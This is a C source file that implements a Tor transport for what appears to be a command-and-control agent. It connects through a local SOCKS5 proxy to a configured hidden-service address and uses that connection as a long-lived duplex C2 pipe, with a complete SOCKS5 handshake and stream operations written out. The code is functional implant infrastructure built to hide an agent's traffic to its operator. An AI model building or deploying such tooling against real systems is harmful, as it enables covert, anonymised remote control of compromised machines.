/*
 * transport_tor.c — a duplex C2 stream over a Tor SOCKS5 proxy.
 *
 * The agent connects to a Tor SOCKS5 listener (127.0.0.1:9050 by default),
 * asks it to CONNECT to the configured hidden-service address, and then treats
 * the resulting TCP connection as the C2 byte pipe. The bridge on the C2 host
 * forwards that stream to the local C2 socket, so the C2 protocol is unchanged.
 *
 * Build with TRANSPORT=tor. The transport option `socks5` overrides the proxy
 * address; the standard `socks5://host:port` form is accepted.
 */

#define _POSIX_C_SOURCE 200809L

#include "transport.h"

#include "http_wire.h"

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

typedef struct {
  int fd;
} tor_ctx;

static int ascii_space(char c) {
  return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

static c2_str trim(c2_str s) {
  while (s.len > 0 && ascii_space(s.ptr[0])) {
    s.ptr++;
    s.len--;
  }
  while (s.len > 0 && ascii_space(s.ptr[s.len - 1]))
    s.len--;
  return s;
}

static c2_str strip_proxy_scheme(c2_str s) {
  static const char socks5[] = "socks5://";
  static const char socks5h[] = "socks5h://";
  if (s.len >= sizeof(socks5) - 1 &&
      memcmp(s.ptr, socks5, sizeof(socks5) - 1) == 0)
    return c2_str_of(s.ptr + sizeof(socks5) - 1, s.len - (sizeof(socks5) - 1));
  if (s.len >= sizeof(socks5h) - 1 &&
      memcmp(s.ptr, socks5h, sizeof(socks5h) - 1) == 0)
    return c2_str_of(s.ptr + sizeof(socks5h) - 1,
                     s.len - (sizeof(socks5h) - 1));
  return s;
}

static int copy_slice(c2_str s, char *out, size_t cap) {
  if (s.len == 0 || s.len >= cap)
    return -1;
  memcpy(out, s.ptr, s.len);
  out[s.len] = '\0';
  return 0;
}

/* Split host[:port], with [IPv6]:port support. */
static int split_endpoint(c2_str addr, char *host, size_t host_cap, char *port,
                          size_t port_cap, const char *default_port) {
  addr = trim(addr);
  if (addr.len == 0 || addr.len >= 1024)
    return -1;

  c2_str h;
  c2_str p = c2_str_of(NULL, 0);
  if (addr.ptr[0] == '[') {
    const char *close = memchr(addr.ptr, ']', addr.len);
    if (close == NULL || close == addr.ptr + 1)
      return -1;
    h = c2_str_of(addr.ptr + 1, (size_t)(close - (addr.ptr + 1)));
    size_t used = (size_t)(close - addr.ptr) + 1;
    if (used < addr.len) {
      if (addr.ptr[used] != ':')
        return -1;
      p = c2_str_of(addr.ptr + used + 1, addr.len - used - 1);
    }
  } else {
    const char *colon = NULL;
    size_t colons = 0;
    for (size_t i = 0; i < addr.len; i++) {
      if (addr.ptr[i] == ':') {
        colon = addr.ptr + i;
        colons++;
      }
    }
    if (colons == 1 && colon != NULL) {
      h = c2_str_of(addr.ptr, (size_t)(colon - addr.ptr));
      p = c2_str_of(colon + 1, addr.len - (size_t)(colon - addr.ptr) - 1);
    } else {
      /* No port, or a bare IPv6 literal; IPv6 with a port needs brackets. */
      h = addr;
    }
  }

  if (copy_slice(h, host, host_cap) != 0)
    return -1;
  if (p.len == 0)
    return copy_slice(c2_str_lit(default_port), port, port_cap);
  return copy_slice(p, port, port_cap);
}

static int parse_port(const char *s, uint16_t *out) {
  char *end = NULL;
  errno = 0;
  unsigned long v = strtoul(s, &end, 10);
  if (errno != 0 || end == s || *end != '\0' || v == 0 || v > 65535)
    return -1;
  *out = (uint16_t)v;
  return 0;
}

static int send_all(int fd, const uint8_t *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    ssize_t n = send(fd, buf + off, len - off, MSG_NOSIGNAL);
    if (n < 0) {
      if (errno == EINTR)
        continue;
      return -1;
    }
    if (n == 0)
      return -1;
    off += (size_t)n;
  }
  return 0;
}

static int recv_exact(int fd, uint8_t *buf, size_t len) {
  size_t off = 0;
  while (off < len) {
    ssize_t n = recv(fd, buf + off, len - off, 0);
    if (n < 0) {
      if (errno == EINTR)
        continue;
      return -1;
    }
    if (n == 0)
      return -1;
    off += (size_t)n;
  }
  return 0;
}

static int socks5_connect(int fd, const char *host, const char *port) {
  uint16_t p = 0;
  if (parse_port(port, &p) != 0)
    return -1;

  const uint8_t greet[3] = {5, 1, 0};
  uint8_t sel[2];
  if (send_all(fd, greet, sizeof(greet)) != 0 ||
      recv_exact(fd, sel, sizeof(sel)) != 0 || sel[0] != 5 || sel[1] != 0)
    return -1;

  uint8_t req[4 + 1 + 255 + 2];
  size_t n = 0;
  req[n++] = 5;
  req[n++] = 1;
  req[n++] = 0;

  struct in_addr v4;
  struct in6_addr v6;
  if (inet_pton(AF_INET, host, &v4) == 1) {
    req[n++] = 1;
    memcpy(req + n, &v4, 4);
    n += 4;
  } else if (inet_pton(AF_INET6, host, &v6) == 1) {
    req[n++] = 4;
    memcpy(req + n, &v6, 16);
    n += 16;
  } else {
    size_t hlen = strlen(host);
    if (hlen == 0 || hlen > 255)
      return -1;
    req[n++] = 3;
    req[n++] = (uint8_t)hlen;
    memcpy(req + n, host, hlen);
    n += hlen;
  }
  req[n++] = (uint8_t)(p >> 8);
  req[n++] = (uint8_t)(p & 0xff);

  if (send_all(fd, req, n) != 0)
    return -1;

  uint8_t reply[4];
  if (recv_exact(fd, reply, sizeof(reply)) != 0 || reply[0] != 5 ||
      reply[1] != 0)
    return -1;

  size_t skip = 0;
  switch (reply[3]) {
  case 1:
    skip = 4 + 2;
    break;
  case 3: {
    uint8_t len = 0;
    if (recv_exact(fd, &len, 1) != 0)
      return -1;
    skip = (size_t)len + 2;
    break;
  }
  case 4:
    skip = 16 + 2;
    break;
  default:
    return -1;
  }
  uint8_t discard[260];
  if (skip > sizeof(discard) || recv_exact(fd, discard, skip) != 0)
    return -1;
  return 0;
}

static long tor_read(void *ctx, uint8_t *buf, size_t cap) {
  tor_ctx *t = (tor_ctx *)ctx;
  if (t == NULL || buf == NULL || cap == 0)
    return C2_ERR_ARG;
  for (;;) {
    ssize_t n = recv(t->fd, buf, cap, 0);
    if (n > 0)
      return (long)n;
    if (n == 0)
      return 0;
    if (errno == EINTR)
      continue;
    return C2_ERR_IO;
  }
}

static long tor_write(void *ctx, const uint8_t *buf, size_t len) {
  tor_ctx *t = (tor_ctx *)ctx;
  if (t == NULL || (buf == NULL && len > 0))
    return C2_ERR_ARG;
  if (send_all(t->fd, buf, len) != 0)
    return C2_ERR_IO;
  return (long)len;
}

static void tor_close(void *ctx) {
  tor_ctx *t = (tor_ctx *)ctx;
  if (t == NULL)
    return;
  if (t->fd >= 0)
    close(t->fd);
  free(t);
}

static const c2_stream_ops tor_ops = {tor_read, tor_write, tor_close};

static c2_status tor_open(void *ctx, const char *url,
                          const c2_http_profile *profile, c2_stream *out) {
  (void)url;
  (void)profile;
  const c2_agent_config *cfg = (const c2_agent_config *)ctx;
  if (cfg == NULL || out == NULL)
    return C2_ERR_ARG;

  char host[256];
  char port[16];
  if (split_endpoint(cfg->cc_address, host, sizeof(host), port, sizeof(port),
                     "80") != 0)
    return C2_ERR_ARG;

  c2_str proxy =
      trim(strip_proxy_scheme(c2_agent_config_option(cfg, "socks5")));
  if (proxy.len == 0)
    proxy = trim(strip_proxy_scheme(c2_agent_config_option(cfg, "proxy")));
  if (proxy.len == 0)
    proxy = c2_str_lit("127.0.0.1:9050");

  char proxy_host[256];
  char proxy_port[16];
  if (split_endpoint(proxy, proxy_host, sizeof(proxy_host), proxy_port,
                     sizeof(proxy_port), "9050") != 0)
    return C2_ERR_ARG;

  int fd = hp_http_tcp_connect(proxy_host, proxy_port, 30, NULL);
  if (fd < 0)
    return C2_ERR_IO;
  if (socks5_connect(fd, host, port) != 0) {
    close(fd);
    return C2_ERR_IO;
  }

  /* The C2 stream is long-lived; the SOCKS handshake timeout must not become
   * a read deadline for the tunnel. */
  struct timeval no_timeout = {0, 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &no_timeout, sizeof(no_timeout));
  setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &no_timeout, sizeof(no_timeout));

  tor_ctx *t = (tor_ctx *)calloc(1, sizeof(*t));
  if (t == NULL) {
    close(fd);
    return C2_ERR_NOMEM;
  }
  t->fd = fd;
  out->ops = &tor_ops;
  out->ctx = t;
  return C2_OK;
}

static const c2_transport_ops tor_transport_ops = {tor_open};

c2_transport c2_transport_create(const c2_agent_config *cfg) {
  c2_transport t;
  t.ops = &tor_transport_ops;
  t.ctx = (void *)cfg;
  return t;
}

const char *c2_transport_name(void) {
  return "tor";
}
